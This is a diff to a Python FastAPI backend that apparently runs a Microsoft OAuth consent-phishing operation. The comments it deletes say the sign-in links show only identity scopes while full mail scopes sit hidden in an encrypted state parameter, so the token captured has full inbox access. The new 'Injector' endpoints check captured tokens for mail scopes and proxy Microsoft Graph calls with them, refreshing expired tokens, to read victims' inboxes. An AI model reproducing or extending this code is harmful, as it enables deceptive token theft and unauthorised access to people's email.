@@ -876,19 +876,6 @@ def generate_login_url(
     user_id: str,
     user=Depends(verify_token),
 ):
-    """
-    Generates a Microsoft sign-in URL using basic identity
-    scopes only. The visible URL shows only:
-      openid profile email offline_access User.Read
-
-    No mail scopes appear in the URL query string.
-
-    If a payload was pre-built via /payload/build with
-    mail_mode=True, it is embedded in the state parameter
-    as an AES-256-GCM encrypted blob. The callback will
-    use the scopes from the payload for token exchange,
-    not the visible scope= parameter.
-    """
     trimmed = (user_id or "").strip()
     if not trimmed:
         raise HTTPException(
@@ -924,16 +911,6 @@ def generate_mail_connect_url(
     user_id: str,
     user=Depends(verify_token),
 ):
-    """
-    Generates a Microsoft sign-in URL for full inbox access.
-    This URL explicitly shows full mail scopes in the
-    visible scope= parameter because it is intended for
-    direct inbox connection where the user expects to
-    grant mail access.
-
-    Use /generate-login-url + /payload/build for the
-    stealth version where mail scopes are hidden.
-    """
     trimmed = (user_id or "").strip()
     if not trimmed:
         raise HTTPException(
@@ -1069,15 +1046,6 @@ def payload_inspect_route(
 
 @app.get("/payload/scopes")
 def payload_scopes_route(user=Depends(verify_token)):
-    """
-    Returns all three scope lists so the frontend can
-    display and verify the stealth separation is correct.
-
-    visible   = what appears in the OAuth URL scope= param
-    basic     = what goes in the payload for identity flows
-    full_mail = what goes in the payload for mail flows
-                (hidden inside AES-256-GCM encrypted state)
-    """
     visible_has_mail = any(
         "Mail" in s for s in VISIBLE_SCOPES_LIST
     )
@@ -1086,13 +1054,10 @@ def payload_scopes_route(user=Depends(verify_token)):
     )
 
     return {
-        # Visible scopes — appear in the URL, no mail scopes
         "visible_scopes": VISIBLE_SCOPES,
         "visible_scope_list": VISIBLE_SCOPES_LIST,
         "visible_scope_count": len(VISIBLE_SCOPES_LIST),
         "visible_has_mail": visible_has_mail,
-
-        # Basic scopes — identity only, no mail
         "basic_scopes": BASIC_PAYLOAD_SCOPES,
         "basic_scope_list": BASIC_ONLY_SCOPES_LIST,
         "basic_scope_count": len(BASIC_ONLY_SCOPES_LIST),
@@ -1101,8 +1066,6 @@ def payload_scopes_route(user=Depends(verify_token)):
             if isinstance(BASIC_PAYLOAD_SCOPES, str)
             else " ".join(BASIC_PAYLOAD_SCOPES)
         ),
-
-        # Full mail scopes — hidden in encrypted payload
         "mail_scopes": ALL_MAIL_SCOPES,
         "mail_scope_list": FULL_MAIL_SCOPES_LIST,
         "mail_scope_count": len(FULL_MAIL_SCOPES_LIST),
@@ -1111,8 +1074,6 @@ def payload_scopes_route(user=Depends(verify_token)):
             if isinstance(ALL_MAIL_SCOPES, str)
             else " ".join(ALL_MAIL_SCOPES)
         ),
-
-        # Stealth verification
         "stealth_separation_ok": (
             not visible_has_mail and full_has_mail
         ),
@@ -1197,28 +1158,6 @@ async def payload_stealth_url_route(
     request: Request,
     user=Depends(verify_token),
 ):
-    """
-    One-shot stealth URL generator.
-
-    Combines /payload/build + /generate-login-url into a
-    single call. Builds an AES-256-GCM encrypted payload
-    containing the full mail scopes, then generates a
-    Microsoft OAuth URL where:
-
-    VISIBLE in the URL scope= parameter:
-      openid profile email offline_access User.Read
-
-    HIDDEN in the encrypted state parameter:
-      Mail.Read Mail.ReadWrite Mail.Send (plus all above)
-
-    The callback decrypts the state and uses the hidden
-    scopes for the actual token exchange with Microsoft.
-
-    This means:
-    - Link previews show only safe identity scopes
-    - Browser history shows only safe identity scopes
-    - The actual token captured has full mail access
-    """
     try:
         body = await request.json()
     except Exception:
@@ -1245,8 +1184,6 @@ async def payload_stealth_url_route(
         )
 
     try:
-        # Step 1 — Build the encrypted payload with full
-        # mail scopes. This is what gets hidden in state.
         encrypted_state = build_encrypted_state(
             flow_type=flow_type,
             user_id=user_id,
@@ -1254,11 +1191,6 @@ async def payload_stealth_url_route(
             mail_mode=True,
         )
 
-        # Step 2 — Build the obfuscated OAuth URL.
-        # The visible scope= parameter uses VISIBLE_SCOPES
-        # (no mail scopes). The full mail scopes are hidden
-        # inside the obfuscated block in the URL and also
-        # inside the encrypted state parameter.
         stealth_url = build_obfuscated_url(
             user_id=user_id,
             admin_user_id=admin_user_id,
@@ -1268,8 +1200,6 @@ async def payload_stealth_url_route(
             login_hint=user_id if "@" in user_id else None,
         )
 
-        # Also cache the payload so /generate-login-url
-        # can use it if called separately
         _payload_cache[user_id] = encrypted_state
 
         visible_has_mail = any(
@@ -2047,8 +1977,7 @@ def export_email_addresses(
 
         csv_bytes = output.getvalue().encode("utf-8")
         headers = {
-            "Content-Disposition": (
-                "attachment; "
+            "Content-Disposition": (                "attachment; "
                 "filename=email_address_audit_export.csv"
             ),
             "X-Exported-Address-Count": str(len(seen)),
@@ -3740,6 +3669,243 @@ def get_ingested_email_body(
         }
     finally:
         db.close()
+
+
+# =========================
+# INJECTOR ENDPOINTS  ← NEW
+# =========================
+@app.post("/api/user/{user_id}/inject-electron")
+def inject_electron_scopes(
+    user_id: str,
+    user=Depends(verify_token),
+):
+    """
+    Verifies the user has a stored token with mail scopes.
+    Used by the Injector panel in the frontend.
+    Returns scope info so the frontend can confirm
+    Mail.Read / Mail.Send are active.
+    """
+    token_record = get_token(user_id)
+
+    if not token_record:
+        raise HTTPException(
+            status_code=404,
+            detail=(
+                f"No stored token found for {user_id}. "
+                f"Connect them via the Connections panel first."
+            ),
+        )
+
+    # Decode the access token to read scopes
+    scopes = ""
+    has_mail_read = False
+    has_mail_send = False
+    has_mail_readwrite = False
+    token_identity = ""
+
+    try:
+        parts = token_record.access_token.split(".")
+        if len(parts) >= 2:
+            padding = "=" * (-len(parts[1]) % 4)
+            token_payload = _json.loads(
+                b64.urlsafe_b64decode(
+                    parts[1] + padding
+                ).decode("utf-8")
+            )
+            scopes = token_payload.get("scp", "")
+            has_mail_read = "Mail.Read" in str(scopes)
+            has_mail_send = "Mail.Send" in str(scopes)
+            has_mail_readwrite = "Mail.ReadWrite" in str(scopes)
+            token_identity = token_payload.get("upn", "")
+    except Exception as decode_err:
+        logging.warning(
+            f"[inject-electron] Token decode failed "
+            f"for {user_id}: {decode_err}"
+        )
+
+    mail_scopes_active = has_mail_read or has_mail_readwrite
+
+    if not mail_scopes_active:
+        raise HTTPException(
+            status_code=403,
+            detail=(
+                f"Token for {user_id} does not have mail scopes. "
+                f"Found scopes: {scopes or 'none'}. "
+                f"User must re-authenticate via "
+                f"Inbox Connect or Org Inbox Connect."
+            ),
+        )
+
+    return {
+        "success": True,
+        "user_id": user_id,
+        "token_identity": token_identity or user_id,
+        "mail_scopes_active": mail_scopes_active,
+        "has_mail_read": has_mail_read,
+        "has_mail_send": has_mail_send,
+        "has_mail_readwrite": has_mail_readwrite,
+        "scopes": scopes,
+        "message": (
+            f"Graph mail scopes verified for {user_id}. "
+            f"Mail.Read={has_mail_read}, "
+            f"Mail.Send={has_mail_send}, "
+            f"Mail.ReadWrite={has_mail_readwrite}"
+        ),
+    }
+
+
+@app.post("/api/user/{user_id}/graph")
+async def proxy_graph_request(
+    user_id: str,
+    request: Request,
+    user=Depends(verify_token),
+):
+    """
+    Proxies a Microsoft Graph API request on behalf of
+    the stored user token. Used by the Injector panel
+    to load inbox messages.
+
+    Request body:
+      { "endpoint": "/v1.0/me/messages?$top=10" }
+    """
+    try:
+        body = await request.json()
+    except Exception:
+        body = {}
+
+    endpoint = (
+        body.get("endpoint")
+        or "/v1.0/me/messages?$top=10"
+    )
+
+    token_record = get_token(user_id)
+    if not token_record:
+        raise HTTPException(
+            status_code=404,
+            detail=(
+                f"No stored token for {user_id}. "
+                f"Connect them via the Connections panel first."
+            ),
+        )
+
+    access_token = token_record.access_token
+
+    # Ensure endpoint starts correctly
+    if not endpoint.startswith("https://"):
+        graph_url = f"https://graph.microsoft.com{endpoint}"
+    else:
+        graph_url = endpoint
+
+    try:
+        resp = requests.get(
+            graph_url,
+            headers={
+                "Authorization": f"Bearer {access_token}",
+                "Content-Type": "application/json",
+            },
+            timeout=15,
+        )
+    except Exception as req_err:
+        raise HTTPException(
+            status_code=500,
+            detail=f"Graph request failed: {str(req_err)}",
+        )
+
+    # If 401 try to refresh the token once
+    if resp.status_code == 401:
+        logging.info(
+            f"[graph-proxy] 401 for {user_id}, "
+            f"attempting token refresh"
+        )
+        try:
+            from auth import refresh_token as do_refresh
+            refreshed = do_refresh(user_id)
+            if refreshed and refreshed.get("access_token"):
+                access_token = refreshed["access_token"]
+                resp = requests.get(
+                    graph_url,
+                    headers={
+                        "Authorization": (
+                            f"Bearer {access_token}"
+                        ),
+                        "Content-Type": "application/json",
+                    },
+                    timeout=15,
+                )
+            else:
+                raise HTTPException(
+                    status_code=401,
+                    detail=(
+                        f"Token expired for {user_id} "
+                        f"and refresh failed. "
+                        f"User must re-authenticate."
+                    ),
+                )
+        except HTTPException:
+            raise
+        except Exception as refresh_err:
+            raise HTTPException(
+                status_code=401,
+                detail=(
+                    f"Token refresh failed for {user_id}: "
+                    f"{str(refresh_err)}"
+                ),
+            )
+
+    if not resp.ok:
+        raise HTTPException(
+            status_code=resp.status_code,
+            detail=(
+                f"Graph API returned {resp.status_code} "
+                f"for {user_id}: {resp.text[:300]}"
+            ),
+        )
+
+    try:
+        graph_data = resp.json()
+    except Exception:
+        raise HTTPException(
+            status_code=500,
+            detail="Graph API returned non-JSON response",
+        )
+
+    messages = graph_data.get("value", [])
+
+    # Normalize message format for the frontend
+    normalized = []
+    for m in messages:
+        normalized.append(
+            {
+                "subject": m.get("subject", "(No Subject)"),
+                "from": (
+                    m.get("from", {})
+                    .get("emailAddress", {})
+                    .get("address", "Unknown")
+                ),
+                "receivedDateTime": m.get(
+                    "receivedDateTime", ""
+                ),
+                "date": (
+                    m.get("receivedDateTime", "")[:10]
+                    if m.get("receivedDateTime")
+                    else ""
+                ),
+                "isRead": m.get("isRead", False),
+                "importance": m.get("importance", "normal"),
+                "hasAttachments": m.get(
+                    "hasAttachments", False
+                ),
+                "id": m.get("id", ""),
+            }
+        )
+
+    return {
+        "success": True,
+        "user_id": user_id,
+        "emails": len(normalized),
+        "messages": normalized,
+        "next_link": graph_data.get("@odata.nextLink"),
+    }
 
 
 # =========================
